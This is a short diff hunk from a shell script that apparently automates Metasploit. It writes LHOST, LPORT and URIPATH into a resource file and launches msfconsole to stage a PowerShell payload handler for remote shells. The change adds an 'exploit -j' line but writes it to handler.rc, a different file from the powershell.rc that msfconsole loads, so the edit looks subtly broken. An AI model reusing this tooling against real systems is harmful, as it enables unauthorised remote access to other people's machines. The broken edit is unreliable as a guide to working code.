@@ -139,7 +139,7 @@
     echo "set LHOST $ip" >> resource/powershell.rc
     echo "set LPORT $port" >> resource/powershell.rc
     echo "set URIPATH /" >> resource/powershell.rc
-  #  echo "run" >> resource/powershell.rc
+     echo "exploit -j" >>  resource/handler.rc
     msfconsole -r resource/powershell.rc
     ;;
     4)
